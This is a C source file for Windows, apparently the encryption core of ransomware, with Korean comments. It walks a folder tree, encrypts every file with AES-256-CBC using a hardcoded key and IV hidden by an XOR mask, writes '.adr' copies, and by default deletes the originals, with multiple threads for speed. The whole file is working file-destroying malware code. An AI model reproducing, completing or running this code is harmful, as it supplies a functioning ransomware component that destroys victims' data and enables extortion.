#define WIN32_LEAN_AND_MEAN
#ifndef _CRT_SECURE_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#endif

#include "encryptor.h"

#include <process.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <openssl/evp.h>

/* ── 내부 상수 ───────────────────────────────────────────── */
#define FILENAME_PADDING 512
#define MAX_THREADS      32
#ifndef SAFE_DEMO
#define SAFE_DEMO 0           /* 1: 원본 rename, 0: 원본 삭제 */
#endif

/* ── 난독화된 KEY / IV (XOR 0xA5) ───────────────────────── */
static const unsigned char XOR_MASK = 0xA5;
static const unsigned char OBF_KEY[32] = {
    0x14,0x5d,0x52,0x3b,0xd8,0xa7,0xa4,0xeb,0x9d,0x00,0x6c,0x42,0x26,0x8d,0xd3,0x18,
    0x5f,0x12,0x22,0xad,0xb8,0xc2,0x1a,0x5f,0xac,0x71,0x96,0x9e,0xce,0xc7,0x6b,0xd9 };
static const unsigned char OBF_IV[16] = {
    0x99,0xdb,0xbc,0xef,0xa5,0x77,0xf0,0x16,0x33,0x84,0x5b,0xcb,0x01,0xac,0x75,0x69 };

/* ── 외부에 노출되는 복원 함수 ──────────────────────────── */
void restore_key(unsigned char* out)
{
    if (!out) return;
    for (size_t i = 0; i < AES_KEY_SIZE; ++i)
        out[i] = OBF_KEY[i] ^ XOR_MASK;
}
void restore_iv(unsigned char* out)
{
    if (!out) return;
    for (size_t i = 0; i < AES_BLOCK_SIZE; ++i)
        out[i] = OBF_IV[i] ^ XOR_MASK;
}

/* ── 간단 로거 ───────────────────────────────────────────── */
static HANDLE           hLog;
static CRITICAL_SECTION csLog;
static volatile LONG    filesDone = 0;

static void log_msg(const char* fmt, ...)
{
    EnterCriticalSection(&csLog);
    char buf[512];
    SYSTEMTIME st; GetLocalTime(&st);
    int n = sprintf(buf, "[%02d:%02d:%02d] ",
        st.wHour, st.wMinute, st.wSecond);
    va_list ap; va_start(ap, fmt);
    n += vsnprintf(buf + n, sizeof(buf) - n, fmt, ap);
    va_end(ap);
    buf[(n < 512) ? n : 511] = '\0';
    DWORD w;
    WriteFile(hLog, buf, (DWORD)strlen(buf), &w, NULL);
    WriteFile(hLog, "\r\n", 2, &w, NULL);
    LeaveCriticalSection(&csLog);
}

/* ── 단일 파일 암호화 함수(공용 API) ───────────────────── */
void encrypt_file(const char* path,
    const unsigned char* key,
    const unsigned char* iv)
{
    FILE* fp = fopen(path, "rb");
    if (!fp) { log_msg("open fail: %s", path); return; }

    fseek(fp, 0, SEEK_END);
    long fsz = ftell(fp);
    rewind(fp);
    if (fsz <= 0) { fclose(fp); return; }

    long plen = fsz + FILENAME_PADDING;
    unsigned char* plain = (unsigned char*)calloc(1, plen);
    fread(plain, 1, fsz, fp);
    fclose(fp);

    size_t fnlen = strlen(path);
    memcpy(plain + fsz,
        path,
        (fnlen < FILENAME_PADDING - 1) ? fnlen : FILENAME_PADDING - 1);

    unsigned char* cipher =
        (unsigned char*)malloc(plen + EVP_MAX_BLOCK_LENGTH);
    int out1 = 0, out2 = 0;

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx ||
        !EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) ||
        !EVP_EncryptUpdate(ctx, cipher, &out1, plain, (int)plen) ||
        !EVP_EncryptFinal_ex(ctx, cipher + out1, &out2))
    {
        log_msg("openssl error: %s", path);
        EVP_CIPHER_CTX_free(ctx);
        free(plain); free(cipher);
        return;
    }
    EVP_CIPHER_CTX_free(ctx);
    free(plain);

    char outname[MAX_PATH];
#if SAFE_DEMO
    snprintf(outname, MAX_PATH, "%s.adr.temp", path);
#else
    snprintf(outname, MAX_PATH, "%s.adr", path);
#endif
    FILE* fo = fopen(outname, "wb");
    if (fo) { fwrite(cipher, 1, out1 + out2, fo); fclose(fo); }
    free(cipher);

#if SAFE_DEMO
    MoveFileExA(path, NULL, MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH);
#else
    DeleteFileA(path);
#endif

    InterlockedIncrement(&filesDone);
}

/* ── 내부 작업 큐 & 스레드 ──────────────────────────────── */
typedef struct { char (*buf)[MAX_PATH]; LONG head, tail; } Q;
static Q      q;
static HANDLE hSem;

static void q_push(const char* p)
{
    LONG i = InterlockedIncrement(&q.tail) - 1;
    strcpy_s(q.buf[i], MAX_PATH, p);
    ReleaseSemaphore(hSem, 1, NULL);
}
static int q_pop(char* dst)
{
    for (;;) {
        if (WaitForSingleObject(hSem, 500) != WAIT_OBJECT_0) return 0;
        LONG i = InterlockedIncrement(&q.head) - 1;
        if (i >= InterlockedAdd(&q.tail, 0)) continue;
        strcpy_s(dst, MAX_PATH, q.buf[i]);
        return 1;
    }
}
static unsigned __stdcall worker(void* unused)
{
    unsigned char key[AES_KEY_SIZE], iv[AES_BLOCK_SIZE];
    restore_key(key);
    restore_iv(iv);
    char path[MAX_PATH];
    while (q_pop(path))
        encrypt_file(path, key, iv);
    return 0;
}

/* ── 재귀 디렉터리 순회 ─────────────────────────────────── */
static void walk_dir(const char* root)
{
    char spec[MAX_PATH]; WIN32_FIND_DATAA fd;
    snprintf(spec, MAX_PATH, "%s\\*", root);
    HANDLE h = FindFirstFileA(spec, &fd);
    if (h == INVALID_HANDLE_VALUE) return;

    do {
        if (!strcmp(fd.cFileName, ".") || !strcmp(fd.cFileName, ".."))
            continue;
        char full[MAX_PATH];
        snprintf(full, MAX_PATH, "%s\\%s", root, fd.cFileName);
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            walk_dir(full);
        else
            q_push(full);
    } while (FindNextFileA(h, &fd));
    FindClose(h);
}

/* ── walker.obj / GUI 모듈이 호출하는 진입점 ───────────── */
void encrypt_filescan_and_encrypt(const char* target_dir)
{
    q.head = q.tail = 0;
    hSem = CreateSemaphore(NULL, 0, 1 << 15, NULL);
    q.buf = (char (*)[MAX_PATH])calloc(1 << 15, MAX_PATH);

    int nth = min(MAX_THREADS,
        max(2, (int)(GetActiveProcessorCount(ALL_PROCESSOR_GROUPS) / 2)));
    HANDLE th[MAX_THREADS];
    for (int i = 0; i < nth; ++i)
        th[i] = (HANDLE)_beginthreadex(NULL, 0, worker, NULL, 0, NULL);

    walk_dir(target_dir);

    for (int i = 0; i < nth; ++i)
        ReleaseSemaphore(hSem, 1, NULL);
    WaitForMultipleObjects(nth, th, TRUE, INFINITE);
}

/* ── 콘솔 실행(옵션) ───────────────────────────────────── */
#ifdef BUILD_STANDALONE_CONSOLE
int main(int argc, char** argv)
{
    if (argc != 2) {
        printf("Usage : %s <folder>\n", argv[0]);
        return 0;
    }
    InitializeCriticalSection(&csLog);

    char logPath[MAX_PATH];
    GetTempPathA(MAX_PATH, logPath);
    strcat_s(logPath, MAX_PATH, "enc_log.txt");
    hLog = CreateFileA(logPath, GENERIC_WRITE, FILE_SHARE_READ, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    encrypt_filescan_and_encrypt(argv[1]);

    printf("done, files = %ld, log = %s\n", filesDone, logPath);
    CloseHandle(hLog);
    DeleteCriticalSection(&csLog);
    return 0;
}
#endif /* BUILD_STANDALONE_CONSOLE */
